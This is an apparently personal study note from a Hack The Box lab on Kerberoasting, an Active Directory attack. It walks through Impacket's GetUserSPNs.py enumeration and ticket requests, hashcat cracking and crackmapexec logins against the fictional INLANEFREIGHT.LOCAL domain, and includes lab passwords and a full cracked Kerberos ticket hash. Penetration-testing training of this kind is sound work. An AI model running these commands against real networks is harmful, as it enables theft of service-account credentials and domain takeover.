# Performing the Attack

## Where can the attack be performed from?

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.

## Tools that can be used for this attack

- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

---

## Kerberoasting with GetUserSPNs.py

Credentials: `forend:Klmcargo2`:

### **Installing Impacket using Pip**

1. Download from [here](https://github.com/SecureAuthCorp/impacket)

```Shell
sudo python3 -m pip install .
```

### **Listing GetUserSPNs.py Help Options**

```Shell
GetUserSPNs.py -h
```

- We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket

### **Listing SPN Accounts with GetUserSPNs.py**

```Shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

- Output
    
    ```Shell
    [!bash!]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forendImpacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
    
    Password:
    ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation
    ---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
    backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>
    sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>
    MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>
    MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>
    MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>
    adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>
    ```
    

### **Requesting all TGS Tickets**

```Shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

### Requesting a Single TGS Ticket

```Shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

### **Saving the TGS Ticket to an Output File**

```Shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

- Output
    
    ```Shell
    z3tssu@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
    
    Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
    
    Password:
    ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation 
    ---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------
    MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  <never>
    ```
    

### **Cracking the Ticket Offline with Hashcat**

```Shell
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

### **Testing Authentication against a Domain Controller**

```Shell
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

  

### HTB Lab

```Shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile SAP_tgs
```

```Shell
 python3 -m http.server 8080
```

```Shell
hashcat -m 13100 SAP_tgs /usr/share/wordlists/rockyou.txt
```

```Shell
$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$2c50d2c76e17dd09f028b2eca81a8689$b99967273b9b4d03708da24b9fe852763b451d7634ef1586fb1c6c9e8b0fb7b46b56b617a33a13acc5429bf6fdd7820bc8b1ec89b1a10b9d47d05400d51377d1d20706db9704d709b6d64bd848539617541f890373219c8316ee4e077685c0531ef353a91e38b0b2003af4c6415de070ff4779d1ee5c001e8f2cf8940119b0dfc46cd73daddf07e7a3528cd340d39f33d903d9aeb4e70c4f02536a220efb0857892132a2f755879235ef9b08f1225adcd196bb7a65a95b20d1bf56bd3786815b76c4e5bd3fc56168fecffb7fcf5ab673ce5b5d6592c7b94a4ed9bb09570b9c4b520373b2683e45fa329a07e17503aae65d1f3b7c762b943899cdbac9ce8f55568d07447f03bb7e7fd235369cc68b094c39de4ba7616373ded91419668add6abbcb0530145a4c741c34a2905308ecef9d03bd2c8a9e9e76e69e96fcba9db72b2af7be853f8d28bbe74a293d131b7c4d5a2fc585f727e02ba3a403c1c20d6b1dbd3eddb7dd4b10b27474e20817f38a10e5ec63b233efcfc09061d2479d2be05c811b927b516c7b90321f673ba347583a9063883948d8559f7f6cd920a05caf1f986216ac4c28e7087454daf8ca862326effb384f0dc5322a9caaf4951ae000633a06a6211d56b86f45a262db572ce1f83c1bb3c460ffee808627a213b69a44f9c47b5ffcc10a2b401543a216e5e28070d0690a2a8973368c8abea17321b7bf8f7caa20e0de5abc0318b560df522bc227f38aded19450de6f251a5b8bd8e01a973969760c6b5457b48d795bff672101c884528271fcbf125be6021bb881345eb1d8ac238e7466f435e0c1aded9f473b6721202242363cb11d2677409b2bdecd6942d07a313c378aad3c2dced5ec28347f3fd8c7ac5a489e45fe43ebbc43bd755bb56929ffcb63a90721f9bc017c217ded61b8e8ce0a77981a8a9fc9edbfbd36ac2092cea0ef1342bd0dd1ceb3e946e05d7b7e648305f342c61f27ac4827d36eba115ee0ea5569ff3fb5f1112d2ac7ce2f49daa083d328475247a4781d4d01d2dae3fc7b726f94302e74e8e112a138f1c2590acfe8d71ee8bd52f239149813f71a04a71fa3cdbfc94e30da23413836eab890867e4c077354eb7b61fc147f8d2b495e94380385883c99f3653fa3dc6c5edc927182975272078e0fa315c3ae7aa8fd2176b955f1797b5f5acb19d0b0fa8ee856b35d739221fcda087ac73cbe01d05ed6067ec030dc9f55fadead894e42331e1d998a5bfc3f9ae730cc7ee8969cf1cd3a643d1d1ceadfa2675b2926fe519cefd30830b13aeb3604b87daa5ef913254cbf1fa9c387e69ab6ee69bda8848f7f8a00a7b906abd1dc23bb4d8b3bac996b994783c031f821394e1f18fe87bcdb373e3d24af20a933677fe9dab90abdf811e569fca883150af184c25f7bc90ba10507e4b75b:!SapperFi2
```